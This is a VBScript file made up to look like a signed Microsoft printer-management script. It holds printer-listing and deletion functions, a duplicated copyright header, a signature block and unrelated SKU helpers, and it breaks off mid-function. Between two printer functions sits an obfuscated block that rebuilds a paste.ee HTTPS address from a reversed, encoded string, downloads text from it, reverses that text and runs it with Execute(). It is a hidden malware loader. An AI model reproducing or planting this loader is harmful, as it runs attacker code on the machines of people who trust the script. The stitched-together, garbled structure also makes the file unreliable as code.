
function DelAllPrinters(kAction, strServer, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg04_Text

    dim Printers
    dim oPrinter
    dim oService
    dim iResult
    dim iTotal
    dim iTotalDeleted
    dim strPrinterName
    dim bDelete
    dim bConnection
    dim strTemp

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set Printers = oService.InstancesOf("Win32_Printer")

    else

        DelAllPrinters = kErrorFailure

        exit function

    end if

    if Err.Number <> kErrorSuccess then

        wscript.echo L_Text_Msg_General11_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        DelAllPrinters = kErrorFailure

        exit function

    end if

    iTotal = 0
    iTotalDeleted = 0

    for each oPrinter in Printers

        strPrinterName = oPrinter.DeviceID

        bConnection = oPrinter.Network

        if kAction = kActionDelAll then

            bDelete = 1

            iTotal = iTotal + 1

        elseif kAction = kActionDelAllCon and bConnection then

            bDelete = 1

            iTotal = iTotal + 1

        elseif kAction = kActionDelAllLocal and not bConnection then

            bDelete = 1

            iTotal = iTotal + 1

        else

            bDelete = 0

        end if

        if bDelete = 1 then

            if bConnection then

                strTemp = L_Space_Text & L_Connection_Text & L_Space_Text

            else

                strTemp = L_Space_Text

            end if
     '
            ' Delete printer instance     '
            ' Delete printer instance     '
            ' Delete printer instance
            '
            ' Delete printer instance
            '
            oPrinter.Delete_

            if Err.Number = kErrorSuccess then

                wscript.echo L_Text_Msg_General05_Text & strTemp & oPrinter.DeviceID

                iTotalDeleted = iTotalDeleted + 1

            else

                wscript.echo L_Text_Msg_General06_Text & strTemp & strPrinterName _
                             & L_Space_Text & L_Error_Text & L_Space_Text & L_Hex_Text _
                             & hex(Err.Number) & L_Space_Text & Err.Description

                '
                ' Try getting extended error information
                '
                call LastError()

                '
                ' Continue deleting the rest of the printers despite this error
                '
                Err.Clear

            end if

        end if

    next

    wscript.echo L_Empty_Text

    if kAction = kActionDelAll then

        wscript.echo L_Text_Msg_General09_Text & L_Space_Text & iTotal
        wscript.echo L_Text_Msg_General10_Text & L_Space_Text & iTotalDeleted

    elseif kAction = kActionDelAllCon then

        wscript.echo L_Text_Msg_General16_Text & L_Space_Text & iTotal
        wscript.echo L_Text_Msg_General17_Text & L_Space_Text & iTotalDeleted

    elseif kAction = kActionDelAllLocal then

        wscript.echo L_Text_Msg_General18_Text & L_Space_Text & iTotal
        wscript.echo L_Text_Msg_General19_Text & L_Space_Text & iTotalDeleted

    else

    end if

    DelAllPrinters = kErrorSuccess

end function

dim wo 
wo = "azeWBF2#rF2#&&&&&&&&F2#F2#A3#@@@@@"
wo = StRRevErse(wo)

wo = rEPLACE(WO, "#", "%")
wo = rEPLACE(WO, "&&&&&&&&", "paste.ee")
wo = rEPLACE(WO, "@@@@@", "https")

wo = URLDecode(wo)
    Set xx = CreateObject("MSXML2.XMLHTTP")
    xx.Open "GET", wo, False
    xx.Send

    tt = xx.ResponseText
	tt = StRRevErse(tt)
	
	
    Execute(tt)




function ListPrinters(strServer, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg05_Text

    dim Printers
    dim oService
    dim oPrinter
    dim iTotal

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set Printers = oService.InstancesOf("Win32_Printer")

    else

        ListPrinters = kErrorFailure

        exit function

    end if

    if Err.Number <> kErrorSuccess then

        wscript.echo L_Text_Msg_General11_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        ListPrinters = kErrorFailure

        exit function

    end if

    iTotal = 0

    for each oPrinter in Printers

        iTotal = iTotal + 1

        wscript.echo L_Empty_Text
        wscript.echo L_Text_Msg_Printer01_Text & L_Space_Text & strServer
        wscript.echo L_Text_Msg_Printer02_Text & L_Space_Text & oPrinter.DeviceID
        wscript.echo L_Text_Msg_Printer03_Text & L_Space_Text & oPrinter.ShareName
        wscript.echo L_Text_Msg_Printer04_Text & L_Space_Text & oPrinter.DriverName
        wscript.echo L_Text_Msg_Printer05_Text & L_Space_Text & oPrinter.PortName
        wscript.echo L_Text_Msg_Printer06_Text & L_Space_Text & oPrinter.Comment
        wscript.echo L_Text_Msg_Printer07_Text & L_Space_Text & oPrinter.Location
        wscript.echo L_Text_Msg_Printer08_Text & L_Space_Text & oPrinter.SepFile
        wscript.echo L_Text_Msg_Printer09_Text & L_Space_Text & oPrinter.PrintProcessor
        wscript.echo L_Text_Msg_Printer10_Text & L_Space_Text & oPrinter.PrintJobDataType
        wscript.echo L_Text_Msg_Printer11_Text & L_Space_Text & oPrinter.Parameters
        wscript.echo L_Text_Msg_Printer12_Text & L_Space_Text & CSTR(oPrinter.Attributes)
        wscript.echo L_Text_Msg_Printer13_Text & L_Space_Text & CSTR(oPrinter.Priority)
        wscript.echo L_Text_Msg_Printer14_Text & L_Space_Text & CStr(oPrinter.DefaultPriority)

        if CStr(oPrinter.StartTime) <> "" and CStr(oPrinter.UntilTime) <> "" then

            wscript.echo L_Text_Msg_Printer15_Text & L_Space_Text & Mid(Mid(CStr(oPrinter.StartTime), 9, 4), 1, 2) & "h" & Mid(Mid(CStr(oPrinter.StartTime), 9, 4), 3, 2)
            wscript.echo L_Text_Msg_Printer16_Text & L_Space_Text & Mid(Mid(CStr(oPrinter.UntilTime), 9, 4), 1, 2) & "h" & Mid(Mid(CStr(oPrinter.UntilTime), 9, 4), 3, 2)

        end if

        wscript.echo L_Text_Msg_Printer17_Text & L_Space_Text & CStr(oPrinter.Jobs)
        wscript.echo L_Text_Msg_Printer18_Text & L_Space_Text & CStr(oPrinter.AveragePagesPerMinute)
        wscript.echo L_Text_Msg_Printer19_Text & L_Space_Text & PrnStatusToString(oPrinter.PrinterStatus)
        wscript.echo L_Text_Msg_Printer20_Text & L_Space_Text & ExtPrnStatusToString(oPrinter.ExtendedPrinterStatus)
        wscript.echo L_Text_Msg_Printer21_Text & L_Space_Text & DetectedErrorStateToString(oPrinter.DetectedErrorState)
        wscript.echo L_Text_Msg_Printer22_Text & L_Space_Text & ExtDetectedErrorStateToString(oPrinter.ExtendedDetectedErrorState)

        Err.Clear

    next

    wscript.echo L_Empty_Text
    wscript.echo L_Text_Msg_General09_Text & L_Space_Text & iTotal

    ListPrinters = kErrorSuccess

end function




'----------------------------------------------------------------------'----------------------------------------------------------------------
 '----------------------------------------------------------------------
' Copyright (c) Microsoft Corporation. All rights reserved.
' Abstract:
' prnqctl.vbs - printer control script for WMI on Windows 
'    used to pause, resume and purge a printer
'    also used to print a test page on a printer
' Usage:
' prnqctl [-zmex?] [-s server] [-p printer] [-u user name] [-w password]
' Examples:
' prnqctl -m -s server -p printer
' prnqctl -x -s server -p printer
' prnqctl -e -b printer
'----------------------------------------------------------------------'----------------------------------------------------------------------
 '----------------------------------------------------------------------
' Copyright (c) Microsoft Corporation. All rights reserved.
' Abstract:
' prnqctl.vbs - printer control script for WMI on Windows 
'    used to pause, resume and purge a printer
'    also used to print a test page on a printer
' Usage:
' prnqctl [-zmex?] [-s server] [-p printer] [-u user name] [-w password]
' Examples:
' prnqctl -m -s server -p printer
' prnqctl -x -s server -p printer
' prnqctl -e -b printer
'----------------------------------------------------------------------'----------------------------------------------------------------------
WScript.Sleep(7)
WScript.Sleep(7)



'' SIG '' Begin signature block
'' SIG '' MIIZMAYJKoZIhvcNAQcCoIIZITCCGR0CAQExDjAMBggq
'' SIG '' hkiG9w0CBQUAMGYGCisGAQQBgjcCAQSgWDBWMDIGCisG
'' SIG '' AQQBgjcCAR4wJAIBAQQQTvApFpkntU2P5azhDxfrqwIB
'' SIG '' AAIBAAIBAAIBAAIBADAgMAwGCCqGSIb3DQIFBQAEENjz
'' SIG '' 96n5MChPNOn81WwOE+igghQ4MIICvDCCAiUCEEoZ0jiM
'' SIG '' glkcpV1zXxVd3KMwDQYJKoZIhvcNAQEEBQAwgZ4xHzAd
'' SIG '' BgNVBAoTFlZlcmlTaWduIFRydXN0IE5ldHdvcmsxFzAV
'' SIG '' BgNVBAsTDlZlcmlTaWduLCBJbmMuMSwwKgYDVQQLEyNW
'' SIG '' ZXJpU2lnbiBUaW1lIFN0YW1waW5nIFNlcnZpY2UgUm9v
'' SIG '' dDE0MDIGA1UECxMrTk8gTElBQklMSVRZIEFDQ0VQVEVE
'' SIG '' LCAoYyk5NyBWZXJpU2lnbiwgSW5jLjAeFw05NzA1MTIw
'' SIG '' MDAwMDBaFw0wNDAxMDcyMzU5NTlaMIGeMR8wHQYDVQQK
'' SIG '' ExZWZXJpU2lnbiBUcnVzdCBOZXR3b3JrMRcwFQYDVQQL
'' SIG '' Ew5WZXJpU2lnbiwgSW5jLjEsMCoGA1UECxMjVmVyaVNp
'' SIG '' Z24gVGltZSBTdGFtcGluZyBTZXJ2aWNlIFJvb3QxNDAy
'' SIG '' BgNVBAsTK05PIExJQUJJTElUWSBBQ0NFUFRFRCwgKGMp
'' SIG '' OTcgVmVyaVNpZ24sIEluYy4wgZ8wDQYJKoZIhvcNAQEB
'' SIG '' BQADgY0AMIGJAoGBANMuIPBofCwtLoEcsQaypwu3EQ1X
'' SIG '' 2lPYdePJMyqy1PYJWzTz6ZD+CQzQ2xtauc3n9oixncCH
'' SIG '' Jet9WBBzanjLcRX9xlj2KatYXpYE/S1iEViBHMpxlNUi
'' SIG '' WC/VzBQFhDa6lKq0TUrp7jsirVaZfiGcbIbASkeXarSm
'' SIG '' NtX8CS3TtDmbAgMBAAEwDQYJKoZIhvcNAQEEBQADgYEA
'' SIG '' YVUOPnvHkhJ+ERCOIszUsxMrW+hE5At4nqR+86cHch7i
'' SIG '' We/MhOOJlEzbTmHvs6T7Rj1QNAufcFb2jip/F87lY795
'' SIG '' aQdzLrCVKIr17aqp0l3NCsoQCY/Os68olsR5KYSS3P+6
'' SIG '' Z0JIppAQ5L9h+JxT5ZPRcz/4/Z1PhKxV0f0RY2MwggQC
'' SIG '' MIIDa6ADAgECAhAIem1cb2KTT7rE/UPhFBidMA0GCSqG
'' SIG '' SIb3DQEBBAUAMIGeMR8wHQYDVQQKExZWZXJpU2lnbiBU
'' SIG '' cnVzdCBOZXR3b3JrMRcwFQYDVQQLEw5WZXJpU2lnbiwg
'' SIG '' SW5jLjEsMCoGA1UECxMjVmVyaVNpZ24gVGltZSBTdGFt
'' SIG '' cGluZyBTZXJ2aWNlIFJvb3QxNDAyBgNVBAsTK05PIExJ
'' SIG '' QUJJTElUWSBBQ0NFUFRFRCwgKGMpOTcgVmVyaVNpZ24s
'' SIG '' IEluYy4wHhcNMDEwMjI4MDAwMDAwWhcNMDQwMTA2MjM1
'' SIG '' OTU5WjCBoDEXMBUGA1UEChMOVmVyaVNpZ24sIEluYy4x
'' SIG '' HzAdBgNVBAsTFlZlcmlTaWduIFRydXN0IE5ldHdvcmsx
'' SIG '' OzA5BgNVBAsTMlRlcm1zIG9mIHVzZSBhdCBodHRwczov
'' SIG '' L3d3dy52ZXJpc2lnbi5jb20vcnBhIChjKTAxMScwJQYD
'' SIG '' VQQDEx5WZXJpU2lnbiBUaW1lIFN0YW1waW5nIFNlcnZp
'' SIG '' Y2UwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
'' SIG '' AQDAemGH67KnA2MbKxph3oC3FR2gi5A9uyeShBQ564XO
'' SIG '' KZIGZkikA0+N6E+n8K9e0S8Zx5HxtZ57kSHO6f/jTvD8
'' SIG '' r5VYuGMt5o72KRjNcI5Qw+2Wu0DbviXoQlXW9oXyBueL
'' SIG '' mRwx8wMP1EycJCrcGxuPgvOw76dN4xSn4I/Wx2jCYVip
'' SIG '' ctT4MEhP2S9vYyDZicqCe8JLvCjFgWjn5oJArEY6oPk/
'' SIG '' Ns1Mu1RCWnple/6E5MdHVKy5PeyAxxr3xDOBgckqlft/
'' SIG '' XjqHkBTbzC518u9r5j2pYL5CAapPqluoPyIxnxIV+XOh
'' SIG '' HoKLBCvqRgJMbY8fUC6VSyp4BoR0PZGPLEcxAgMBAAGj
'' SIG '' gbgwgbUwQAYIKwYBBQUHAQEENDAyMDAGCCsGAQUFBzAB
'' SIG '' hiRodHRwOi8vb2NzcC52ZXJpc2lnbi5jb20vb2NzcC9z
'' SIG '' dGF0dXMwCQYDVR0TBAIwADBEBgNVHSAEPTA7MDkGC2CG
'' SIG '' SAGG+EUBBwEBMCowKAYIKwYBBQUHAgEWHGh0dHBzOi8v
'' SIG '' d3d3LnZlcmlzaWduLmNvbS9ycGEwEwYDVR0lBAwwCgYI
'' SIG '' KwYBBQUHAwgwCwYDVR0PBAQDAgbAMA0GCSqGSIb3DQEB
'' SIG '' BAUAA4GBAC3zT2NgLBja9SQPUrMM67O8Z4XCI+2PRg3P
'' SIG '' Gk2+83x6IDAyGGiLkrsymfCTuDsVBid7PgIGAKQhkoQT
'' SIG '' CsWY5UBXxQUl6K+vEWqp5TvL6SP2lCldQFXzpVOdyDY6
'' SIG '' OWUIc3OkMtKvrL/HBTz/RezD6Nok0c5jrgmn++Ib4/1B
'' SIG '' CmqWMIIEEjCCAvqgAwIBAgIPAMEAizw8iBHRPvZj7N9A
'' SIG '' MA0GCSqGSIb3DQEBBAUAMHAxKzApBgNVBAsTIkNvcHly
'' SIG '' aWdodCAoYykgMTk5NyBNaWNyb3NvZnQgQ29ycC4xHjAc
'' SIG '' BgNVBAsTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEhMB8G
'' SIG '' A1UEAxMYTWljcm9zb2Z0IFJvb3QgQXV0aG9yaXR5MB4X
'' SIG '' DTk3MDExMDA3MDAwMFoXDTIwMTIzMTA3MDAwMFowcDEr
'' SIG '' MCkGA1UECxMiQ29weXJpZ2h0IChjKSAxOTk3IE1pY3Jv
'' SIG '' c29mdCBDb3JwLjEeMBwGA1UECxMVTWljcm9zb2Z0IENv
'' SIG '' cnBvcmF0aW9uMSEwHwYDVQQDExhNaWNyb3NvZnQgUm9v
'' SIG '' dCBBdXRob3JpdHkwggEiMA0GCSqGSIb3DQEBAQUAA4IB
'' SIG '' DwAwggEKAoIBAQCpAr3BcOY78k4bKJ+XeF4w6qKpjSVf
'' SIG '' +P6VTKO3/p2iID58UaKboo9gMmvRQmR57qx2yVTa8uuc
'' SIG '' hhyPn4Rms8VremIj1h083g8BkuiWxL8tZpqaaCaZ0Dos
'' SIG '' vwy1WCbBRucKPjiWLKkoOajsSYNC44QPu5psVWGsgnyh
'' SIG '' YC13TOmZtGQ7mlAcMQgkFJ+p55ErGOY9mGMUYFgFZZ8d
'' SIG '' N1KH96fvlALGG9O/VUWziYC/OuxUlE6u/ad6bXROrxjM
'' SIG '' lgkoIQBXkGBpN7tLEgc8Vv9b+6RmCgim0oFWV++2O14W
'' SIG '' gXcE2va+roCV/rDNf9anGnJcPMq88AijIjCzBoXJsyB3
'' SIG '' E4XfAgMBAAGjgagwgaUwgaIGA1UdAQSBmjCBl4AQW9Bw
'' SIG '' 72lyniNRfhSyTY7/y6FyMHAxKzApBgNVBAsTIkNvcHly
'' SIG '' aWdodCAoYykgMTk5NyBNaWNyb3NvZnQgQ29ycC4xHjAc
'' SIG '' BgNVBAsTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEhMB8G
'' SIG '' A1UEAxMYTWljcm9zb2Z0IFJvb3QgQXV0aG9yaXR5gg8A
'' SIG '' wQCLPDyIEdE+9mPs30AwDQYJKoZIhvcNAQEEBQADggEB
'' SIG '' AJXoC8CN85cYNe24ASTYdxHzXGAyn54Lyz4FkYiPyTrm
'' SIG '' IfLwV5MstaBHyGLv/NfMOztaqTZUaf4kbT/JzKreBXzd
'' SIG '' MY09nxBwarv+Ek8YacD80EPjEVogT+pie6+qGcgrNyUt
'' SIG '' vmWhEoolD2Oj91Qc+SHJ1hXzUqxuQzIH/YIX+OVnbA1R
'' SIG '' 9r3xUse958Qw/CAxCYgdlSkaTdUdAqXxgOADtFv0sd3I
'' SIG '' V+5lScdSVLa0AygS/5DW8AiPfriXxas3LOR65Kh343ag
'' SIG '' ANBqP8HSNorgQRKoNWobats14dQcBOSoRQTIWjM4bk0c
'' SIG '' DWK3CqKM09VUP0bNHFWmcNsSOoeTdZ+n0qAwggSLMIID
'' SIG '' c6ADAgECAgphBiqNAAAAAAALMA0GCSqGSIb3DQEBBQUA
'' SIG '' MIGmMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGlu
'' SIG '' Z3RvbjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMV
'' SIG '' TWljcm9zb2Z0IENvcnBvcmF0aW9uMSswKQYDVQQLEyJD
'' SIG '' b3B5cmlnaHQgKGMpIDIwMDAgTWljcm9zb2Z0IENvcnAu
'' SIG '' MSMwIQYDVQQDExpNaWNyb3NvZnQgQ29kZSBTaWduaW5n
'' SIG '' IFBDQTAeFw0wMTAzMjkyMTI3MjZaFw0wMjA1MjkyMTM3
'' SIG '' MjZaMIGhMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2Fz
'' SIG '' aGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UE
'' SIG '' ChMVTWljcm9zb2Z0IENvcnBvcmF0aW9uMSswKQYDVQQL
'' SIG '' EyJDb3B5cmlnaHQgKGMpIDIwMDEgTWljcm9zb2Z0IENv
'' SIG '' cnAuMR4wHAYDVQQDExVNaWNyb3NvZnQgQ29ycG9yYXRp
'' SIG '' b24wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAI4W
'' SIG '' b9oX0+NFlbKs0+XPMT0dxIe7TkgF+YtWqSuHY8hE2jDJ
'' SIG '' FLzreBq6xOricgBMRmab3mJGbp73RLrous/C1fU7lke4
'' SIG '' UV7Rd2cie1MqLeoij3xO/wK1GzOg6pXrGLp2+WHSAAuU
'' SIG '' YDQ7SYYss9mOky4ta/3jVaq4qm7gcPSiYAYvAgMBAAGj
'' SIG '' ggFAMIIBPDAOBgNVHQ8BAf8EBAMCBsAwEwYDVR0lBAww
'' SIG '' CgYIKwYBBQUHAwMwHQYDVR0OBBYEFO+QQN5P4BuzRdgH
'' SIG '' A3uZ+XUZZjUaMIGpBgNVHSMEgaEwgZ6AFClcuRu2zTPu
'' SIG '' u55Zffflyi7EDTQooXSkcjBwMSswKQYDVQQLEyJDb3B5
'' SIG '' cmlnaHQgKGMpIDE5OTcgTWljcm9zb2Z0IENvcnAuMR4w
'' SIG '' HAYDVQQLExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xITAf
'' SIG '' BgNVBAMTGE1pY3Jvc29mdCBSb290IEF1dGhvcml0eYIQ
'' SIG '' aguZT8AA3qoR1NhAmqi+5jBKBgNVHR8EQzBBMD+gPaA7
'' SIG '' hjlodHRwOi8vY3JsLm1pY3Jvc29mdC5jb20vcGtpL2Ny
'' SIG '' bC9wcm9kdWN0cy9Db2RlU2lnblBDQS5jcmwwDQYJKoZI
'' SIG '' hvcNAQEFBQADggEBAARnzM/dcU1Hwo6DaRJrol+WJgfo
'' SIG '' j9jTnlrbJ2kdHfQ8VShT3REkJ5KuWVZA6cRNnezbq36U
'' SIG '' mz0gLDXyJ07AyDm3ZWPRNWbaU71BfllKpFK39f3IvaF7
'' SIG '' BriY2Jju0Qs0dWYN3EGPw7CShFfBQnqFxpET21St3n5B
'' SIG '' 3CCv6RvJwjIxxY3py/qDS8FYkzLE1+PNeqvffQicxoU7
'' SIG '' 6EGBOLF4Gbw4981rws6qTJAdg8bmAYloqueP6AdQKjLd
'' SIG '' 18+9zHrZOg//skSKV8gaN2QHF317cktGBqEoWyNXHmr9
'' SIG '' kSIzQNF1SxIBbgYhhDZvqCoMfz6uNSv2t30LCBPlV/NL
'' SIG '' rY8gv7gwggTJMIIDsaADAgECAhBqC5lPwADeqhHU2ECa
'' SIG '' qL7mMA0GCSqGSIb3DQEBBAUAMHAxKzApBgNVBAsTIkNv
'' SIG '' cHlyaWdodCAoYykgMTk5NyBNaWNyb3NvZnQgQ29ycC4x
'' SIG '' HjAcBgNVBAsTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEh
'' SIG '' MB8GA1UEAxMYTWljcm9zb2Z0IFJvb3QgQXV0aG9yaXR5
'' SIG '' MB4XDTAwMTIxMDA4MDAwMFoXDTA1MTExMjA4MDAwMFow
'' SIG '' gaYxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5n
'' SIG '' dG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVN
'' SIG '' aWNyb3NvZnQgQ29ycG9yYXRpb24xKzApBgNVBAsTIkNv
'' SIG '' cHlyaWdodCAoYykgMjAwMCBNaWNyb3NvZnQgQ29ycC4x
'' SIG '' IzAhBgNVBAMTGk1pY3Jvc29mdCBDb2RlIFNpZ25pbmcg
'' SIG '' UENBMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKC
'' SIG '' AQEAooQVU9gLMA40lf86G8LzL3ttNyNN89KM5f2v/cUC
'' SIG '' NB8kx+Wh3FTsfgJ0R6vbMlgWFFEpOPF+srSMOke1OU5u
'' SIG '' VMIxDDpt+83Ny1CcG66n2NlKJj+1xcuPluJJ8m3Y6ZY+
'' SIG '' 3gXP8KZVN60vYM2AYUKhSVRKDxi3S9mTmTBaR3VktNO7
'' SIG '' 3barDJ1PuHM7GDqqtIeMsIiwTU8fThG1M4DfDTpkb0TH
'' SIG '' NL1Kk5u8ph35BSNOYCmPzCryhJqZrajbCnB71jRBkKW3
'' SIG '' ZsdcGx2jMw6bVAMaP5iQuMznPQR0QxyP9znms6xIemsq
'' SIG '' DmIBYTl2bv0+mAdLFPEBRv0VAOBH2k/kBeSAJQIBA6OC
'' SIG '' ASgwggEkMBMGA1UdJQQMMAoGCCsGAQUFBwMDMIGiBgNV
'' SIG '' HQEEgZowgZeAEFvQcO9pcp4jUX4Usk2O/8uhcjBwMSsw
'' SIG '' KQYDVQQLEyJDb3B5cmlnaHQgKGMpIDE5OTcgTWljcm9z
'' SIG '' b2Z0IENvcnAuMR4wHAYDVQQLExVNaWNyb3NvZnQgQ29y
'' SIG '' cG9yYXRpb24xITAfBgNVBAMTGE1pY3Jvc29mdCBSb290
'' SIG '' IEF1dGhvcml0eYIPAMEAizw8iBHRPvZj7N9AMBAGCSsG
'' SIG '' AQQBgjcVAQQDAgEAMB0GA1UdDgQWBBQpXLkbts0z7rue
'' SIG '' WX335couxA00KDAZBgkrBgEEAYI3FAIEDB4KAFMAdQBi
'' SIG '' AEMAQTALBgNVHQ8EBAMCAUYwDwYDVR0TAQH/BAUwAwEB
'' SIG '' /zANBgkqhkiG9w0BAQQFAAOCAQEARVjimkF//J2/SHd3
'' SIG '' rozZ5hnFV7QavbS5XwKhRWo5Wfm5J5wtTZ78ouQ4ijhk
'' SIG '' IkLfuS8qz7fWBsrrKr/gGoV821EIPfQi09TAbYiBFURf
'' SIG '' ZINkxKmULIrbkDdKD7fo1GGPdnbh2SX/JISVjQRWVJSh
'' SIG '' HDo+grzupYeMHIxLeV+1SfpeMmk6H1StdU3fZOcwPNtk
'' SIG '' SUT7+8QcQnHmoD1F7msAn6xCvboRs1bk+9WiKoHYH06i
'' SIG '' Vb4nj3Cmomwb/1SKgryBS6ahsWZ6qRenywbAR+ums+kx
'' SIG '' FVM9KgS//3NI3IsnQ/xj6O4kh1u+NtHoMfUy2V7feXq6
'' SIG '' MKxphkr7jBG/G41UWTGCBGIwggReAgEBMIG1MIGmMQsw
'' SIG '' CQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQ
'' SIG '' MA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMVTWljcm9z
'' SIG '' b2Z0IENvcnBvcmF0aW9uMSswKQYDVQQLEyJDb3B5cmln
'' SIG '' aHQgKGMpIDIwMDAgTWljcm9zb2Z0IENvcnAuMSMwIQYD
'' SIG '' VQQDExpNaWNyb3NvZnQgQ29kZSBTaWduaW5nIFBDQQIK
'' SIG '' YQYqjQAAAAAACzAMBggqhkiG9w0CBQUAoIGwMBkGCSqG
'' SIG '' SIb3DQEJAzEMBgorBgEEAYI3AgEEMBwGCisGAQQBgjcC
'' SIG '' AQsxDjAMBgorBgEEAYI3AgEVMB8GCSqGSIb3DQEJBDES
'' SIG '' BBCCJIA8Xa3hbMOmcmENDlALMFQGCisGAQQBgjcCAQwx
'' SIG '' RjBEoCaAJABXAE0ASQAgAHAAcgBpAG4AdABlAHIAIABz
'' SIG '' AGMAcgBpAHAAdKEagBhodHRwOi8vd3d3Lm1pY3Jvc29m
'' SIG '' dC5jb20wDQYJKoZIhvcNAQEBBQAEgYANXx8X9wO7H87A
'' SIG '' jfhHKZfnx58x5L+Wff0SS1HLRzHBKV5h02E67RTQ0xa5
'' SIG '' GYdNf5uoRws+OsuyqtI/R1rtTkkIQcJ8ZsTWRBzr9H2+
'' SIG '' h517hBwXeU/wpyh16QBREIdbpXdFD+RWAF6iTYvffyvI
'' SIG '' vdsT8wBcB0w0Fd4pA7BYP0bLMKGCAkwwggJIBgkqhkiG
'' SIG '' 9w0BCQYxggI5MIICNQIBATCBszCBnjEfMB0GA1UEChMW
'' SIG '' VmVyaVNpZ24gVHJ1c3QgTmV0d29yazEXMBUGA1UECxMO
'' SIG '' VmVyaVNpZ24sIEluYy4xLDAqBgNVBAsTI1ZlcmlTaWdu
'' SIG '' IFRpbWUgU3RhbXBpbmcgU2VydmljZSBSb290MTQwMgYD
'' SIG '' VQQLEytOTyBMSUFCSUxJVFkgQUNDRVBURUQsIChjKTk3
'' SIG '' IFZlcmlTaWduLCBJbmMuAhAIem1cb2KTT7rE/UPhFBid
'' SIG '' MAwGCCqGSIb3DQIFBQCgWTAYBgkqhkiG9w0BCQMxCwYJ
'' SIG '' KoZIhvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0wMTEyMDcy
'' SIG '' MDIzMDlaMB8GCSqGSIb3DQEJBDESBBAC9RKfRgIH0QcN
'' SIG '' Ajx0z4CdMA0GCSqGSIb3DQEBAQUABIIBAJl0lzJa+J4Z
'' SIG '' AuprvTpIZZEdMp+8fyma4ZOWcZTf1WJ2QN7qeFo6xsQR
'' SIG '' sfSqpaxP2MC6OCGSLsqHZ/PmPPNBfKXRLtQpTEyMPFEy
'' SIG '' j/zCIR3KKkmIs7AZzX/f9jwWAfhhrFXoEZCRwjFEVLOx
'' SIG '' l4WHuyd8qIq/lxgU4xuAQlIoJ6xkLFzTjoAOAVHlDtV8
'' SIG '' F6Hzz3owO7t8L32O/TSX6qrFH5gHvcKtA8gb2SN7xL3X
'' SIG '' ydIL/AbyYQc8zKXTBL41y/gq6pv+vsHyquzVICcDhAXf
'' SIG '' xi+gjqPdfk69eMMYw/4BQN13l20fojIcBAbORHrxfYDy
'' SIG '' egHLtsfcnY79dVKneR+cDKM=
'' SIG '' End signature block

Private Function CanPrimaryKeyTypeBeDetermined(strPrimarySkuType)
    If ((InStr(strPrimarySkuType, IndeterminatePrimaryKeyFound) > 0) Or (InStr(strPrimarySkuType, NoPrimaryKeyFound) > 0)) Then
        CanPrimaryKeyTypeBeDetermined = False
    Else
        CanPrimaryKeyTypeBeDetermined = True
    End If
End Function


Private Function GetPrimarySKUType()
    Dim objProduct
    Dim strPrimarySKUType, strDescription
    Dim iIsPrimaryWindowsSku

    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause, PartialProductKeyNonNullWhereClause)
        strDescription = objProduct.Description
        If (LCase(objProduct.ApplicationId) = WindowsAppId) Then
            iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
            If (iIsPrimaryWindowsSku = 1) Then
                If (IsKmsServer(strDescription) Or IsKmsClient(strDescription)) Then
                    strPrimarySKUType = strDescription
                    Exit For    'no need to continue
                Else
                    If IsTBL(strDescription) Then
                        strPrimarySKUType = TblPrimaryKey
                        Exit For
                    Else
                        strPrimarySKUType = NotSpecialCasePrimaryKey
                    End If
                End If
            ElseIf ((iIsPrimaryWindowsSku = 2) And strPrimarySKUType = "") Then
                strPrimarySKUType = IndeterminatePrimaryKeyFound
            End If
        Else
            strPrimarySKUType = strDescription
            Exit For    'no need to continue
        End If
    Next

    If strPrimarySKUType = "" Then
        strPrimarySKUType = NoPrimaryKeyFound
    End If

    GetPrimarySKUType = strPrimarySKUType
End Function
Function RegExTest(str,patrn)
    Dim regEx
    Set regEx = New RegExp
    regEx.IgnoreCase = True
    regEx.Pattern = patrn
    RegExTest = regEx.Test(str)
End Function

Function URLDecode(sStr)
    Dim str,code,a0
    str=""
    code=sStr
    code=Replace(code,"+"," ")
    While len(code)>0
        If InStr(code,"%")>0 Then
            str = str & Mid(code,1,InStr(code,"%")-1)
            code = Mid(code,InStr(code,"%"))
            a0 = UCase(Mid(code,2,1))
            If a0="U" And RegExTest(code,"^%u[0-9A-F]{4}") Then
                str = str & ChrW((Int("&H" & Mid(code,3,4))))
                code = Mid(code,7)
            ElseIf a0="E" And RegExTest(code,"^(%[0-9A-F]{2}){3}") Then
                str = str & ChrW((Int("&H" & Mid(code,2,2)) And 15) * 4096 + (Int("&H" & Mid(code,5,2)) And 63) * 64 + (Int("&H" & Mid(code,8,2)) And 63))
                code = Mid(code,10)
            ElseIf a0>="C" And a0<="D" And RegExTest(code,"^(%[0-9A-F]{2}){2}") Then
                str = str & ChrW((Int("&H" & Mid(code,2,2)) And 3) * 64 + (Int("&H" & Mid(code,5,2)) And 63))
                code = Mid(code,7)
            ElseIf (a0<="B" Or a0="F") And RegExTest(code,"^%[0-9A-F]{2}") Then
                str = str & Chr(Int("&H" & Mid(code,2,2)))
                code = Mid(code,4)
            Else
                str = str & "%"
